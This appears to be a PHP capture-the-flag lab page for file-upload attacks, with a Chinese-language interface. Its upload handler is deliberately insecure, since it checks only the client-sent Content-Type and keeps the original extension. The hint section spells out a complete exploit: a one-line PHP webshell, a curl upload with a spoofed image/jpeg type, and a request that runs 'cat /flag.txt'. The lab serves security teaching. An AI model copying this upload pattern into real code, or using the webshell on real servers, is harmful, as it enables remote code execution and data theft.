<?php
// ===== Upload handler =====
$upload_dir = __DIR__ . '/uploads/';
$upload_url = '/uploads/';
$error   = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file      = $_FILES['file'];
    $orig_name = basename($file['name']);
    $mime_type = $file['type']; // VULNERABLE: this is the Content-Type header sent by the client

    // Only check MIME type — completely user-controlled!
    $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

    if ($file['error'] !== UPLOAD_ERR_OK) {
        $error = '上傳失敗，請再試一次。';
    } elseif (!in_array($mime_type, $allowed_mimes)) {
        $error = "不允許的檔案類型：{$mime_type}。只接受 image/jpeg、image/png、image/gif。";
    } else {
        // Save with original filename (including any extension)
        $dest = $upload_dir . $orig_name;
        if (move_uploaded_file($file['tmp_name'], $dest)) {
            $success = $orig_name;
        } else {
            $error = '儲存失敗，請確認目錄權限。';
        }
    }
}

// ===== Gallery: list uploaded files =====
$uploaded = array_values(array_filter(
    scandir($upload_dir),
    fn($f) => $f !== '.' && $f !== '..' && $f !== '.gitkeep'
));
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>AIS3 ImageHub — 圖片上傳</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  :root {
    --bg: #0f1117; --card: #1a1f2e; --border: #252d3d;
    --accent: #f87171; --text: #e2e8f0; --text-dim: #8892a4;
    --danger: #ef4444; --success: #22c55e;
  }
  body { font-family: system-ui, 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
  nav { background: #090c12; border-bottom: 1px solid var(--border); padding: 0 2rem; height: 56px; display: flex; align-items: center; }
  .logo { font-weight: 700; font-size: 1.05rem; color: var(--accent); }
  .logo span { color: var(--text-dim); font-weight: 400; font-size: 0.78rem; margin-left: 0.5rem; }
  .container { max-width: 860px; margin: 0 auto; padding: 2rem; }
  code { background: rgba(248,113,113,0.1); color: var(--accent); padding: 0.1rem 0.4rem; border-radius: 3px; font-size: 0.85rem; font-family: monospace; }
  pre { background: #090c12; border: 1px solid var(--border); border-radius: 8px; padding: 1.2rem 1.5rem; font-family: monospace; font-size: 0.82rem; line-height: 1.7; overflow-x: auto; color: var(--text-dim); }
  pre .cmd { color: var(--accent); }
  pre .cmt { color: #4a5568; }
  .hero { margin-bottom: 2rem; }
  .hero .badge { display: inline-block; background: rgba(248,113,113,0.12); color: var(--accent); border: 1px solid rgba(248,113,113,0.3); padding: 0.2rem 0.7rem; border-radius: 20px; font-size: 0.72rem; font-weight: 700; letter-spacing: 0.08em; margin-bottom: 0.8rem; }
  .hero h1 { font-size: 1.7rem; color: var(--accent); margin-bottom: 0.3rem; }
  .hero p { color: var(--text-dim); font-size: 0.9rem; line-height: 1.7; }
  .section { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem; margin-bottom: 1.2rem; }
  .section h3 { font-size: 0.8rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.09em; margin-bottom: 1rem; }
  .upload-area { border: 2px dashed var(--border); border-radius: 8px; padding: 2rem; text-align: center; transition: border-color 0.2s; }
  .upload-area:hover { border-color: var(--accent); }
  .upload-area .icon { font-size: 2.5rem; margin-bottom: 0.8rem; }
  .upload-area p { color: var(--text-dim); font-size: 0.88rem; margin-bottom: 1.2rem; }
  .upload-area input[type=file] { display: none; }
  .upload-area label { display: inline-block; padding: 0.5rem 1.2rem; background: rgba(248,113,113,0.12); color: var(--accent); border: 1px solid rgba(248,113,113,0.3); border-radius: 6px; cursor: pointer; font-size: 0.85rem; font-weight: 600; transition: opacity 0.2s; }
  .upload-area label:hover { opacity: 0.8; }
  #file-name { margin-top: 0.7rem; font-size: 0.82rem; color: var(--text-dim); font-family: monospace; }
  .btn-upload { margin-top: 1rem; padding: 0.6rem 1.8rem; background: var(--accent); color: #090c12; border: none; border-radius: 6px; font-size: 0.9rem; font-weight: 700; cursor: pointer; transition: opacity 0.2s; }
  .btn-upload:hover { opacity: 0.88; }
  .alert { padding: 0.8rem 1.1rem; border-radius: 7px; font-size: 0.88rem; margin-bottom: 1rem; line-height: 1.6; }
  .alert-err { background: rgba(239,68,68,0.09); border: 1px solid rgba(239,68,68,0.3); color: var(--danger); }
  .alert-ok  { background: rgba(34,197,94,0.09); border: 1px solid rgba(34,197,94,0.3); color: var(--success); }
  .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 0.9rem; }
  .gitem { background: #0a0d14; border: 1px solid var(--border); border-radius: 8px; padding: 0.8rem; text-align: center; }
  .gitem .gicon { font-size: 2rem; margin-bottom: 0.5rem; }
  .gitem .gname { font-family: monospace; font-size: 0.78rem; color: var(--text-dim); word-break: break-all; margin-bottom: 0.5rem; }
  .gitem a { display: inline-block; font-size: 0.75rem; color: var(--accent); text-decoration: none; border: 1px solid rgba(248,113,113,0.3); padding: 0.2rem 0.6rem; border-radius: 4px; }
  .gitem a:hover { opacity: 0.78; }
  .hint-box { background: rgba(248,113,113,0.06); border: 1px solid rgba(248,113,113,0.2); border-radius: 8px; padding: 1rem 1.2rem; font-size: 0.83rem; color: var(--text-dim); line-height: 1.7; }
  .hint-box strong { color: var(--accent); }
  .step-list { list-style: none; counter-reset: step; }
  .step-list li { counter-increment: step; display: flex; align-items: flex-start; gap: 0.7rem; margin-bottom: 0.5rem; font-size: 0.85rem; color: var(--text-dim); line-height: 1.6; }
  .step-list li::before { content: counter(step); background: rgba(248,113,113,0.12); color: var(--accent); border: 1px solid rgba(248,113,113,0.3); min-width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.72rem; font-weight: 700; margin-top: 0.15rem; flex-shrink: 0; }
</style>
</head>
<body>
<nav>
  <div class="logo">AIS3 ImageHub<span>圖片上傳平台</span></div>
</nav>

<div class="container">

  <div class="hero">
    <div class="badge">FILE UPLOAD LAB</div>
    <h1>圖片上傳平台</h1>
    <p>這個平台只允許上傳圖片（JPEG、PNG、GIF）。<br>
    你的任務：繞過這個限制，上傳一個 PHP webshell，然後用它讀取 <code>/flag.txt</code>。</p>
  </div>

  <div class="section">
    <h3>&#128444; 上傳圖片</h3>

    <?php if ($error): ?>
    <div class="alert alert-err"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <?php if ($success): ?>
    <div class="alert alert-ok">
      上傳成功！檔案路徑：<code><a href="<?= $upload_url . htmlspecialchars($success) ?>" style="color:var(--success)" target="_blank">/uploads/<?= htmlspecialchars($success) ?></a></code>
    </div>
    <?php endif; ?>

    <form method="POST" enctype="multipart/form-data">
      <div class="upload-area">
        <div class="icon">&#128444;</div>
        <p>只接受圖片格式（系統會驗證 Content-Type）</p>
        <label for="file-input">選擇檔案</label>
        <input type="file" id="file-input" name="file" onchange="document.getElementById('file-name').textContent = this.files[0]?.name || ''">
        <div id="file-name"></div>
        <button type="submit" class="btn-upload">上傳</button>
      </div>
    </form>
  </div>

  <div class="section">
    <h3>&#128448; 已上傳的檔案</h3>
    <?php if (empty($uploaded)): ?>
    <p style="color:var(--text-dim);font-size:0.88rem">尚未上傳任何檔案。</p>
    <?php else: ?>
    <div class="gallery">
      <?php foreach ($uploaded as $f): ?>
      <?php
        $ext = strtolower(pathinfo($f, PATHINFO_EXTENSION));
        $icon = in_array($ext, ['jpg','jpeg','png','gif','webp']) ? '&#128444;' : '&#128196;';
      ?>
      <div class="gitem">
        <div class="gicon"><?= $icon ?></div>
        <div class="gname"><?= htmlspecialchars($f) ?></div>
        <a href="<?= $upload_url . urlencode($f) ?>" target="_blank">開啟</a>
      </div>
      <?php endforeach; ?>
    </div>
    <?php endif; ?>
  </div>

  <div class="section">
    <h3>&#128161; 提示</h3>
    <div class="hint-box">
      <strong>伺服器的驗證邏輯：</strong>
      <ol class="step-list" style="margin-top:0.8rem">
        <li>取得 <code>$_FILES['file']['type']</code>（這是 HTTP 請求中的 <code>Content-Type</code> header）</li>
        <li>確認是否在白名單：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code></li>
        <li>通過就儲存，檔名保留原本的副檔名</li>
      </ol>
      <br>
      <strong>問題：</strong><code>Content-Type</code> 是由<em>客戶端</em>提供的，完全可以偽造。<br><br>
      <strong>攻擊步驟：</strong>
      <ol class="step-list" style="margin-top:0.6rem">
        <li>建立一個 PHP webshell：<code>&lt;?php system($_GET["cmd"]); ?&gt;</code>，儲存為 <code>shell.php</code></li>
        <li>用 curl 上傳，同時把 Content-Type 偽造成 <code>image/jpeg</code></li>
        <li>訪問上傳後的 <code>/uploads/shell.php?cmd=cat+/flag.txt</code></li>
      </ol>
    </div>

    <pre style="margin-top:1rem"><span class="cmt"># 建立 webshell</span>
<span class="cmd">echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</span>

<span class="cmt"># 上傳：用 curl 偽造 Content-Type</span>
<span class="cmd">curl -s -X POST http://localhost:10007/ \
  -F "file=@shell.php;type=image/jpeg"</span>

<span class="cmt"># 執行指令，讀取 flag</span>
<span class="cmd">curl "http://localhost:10007/uploads/shell.php?cmd=cat+/flag.txt"</span></pre>
  </div>

</div>
</body>
</html>
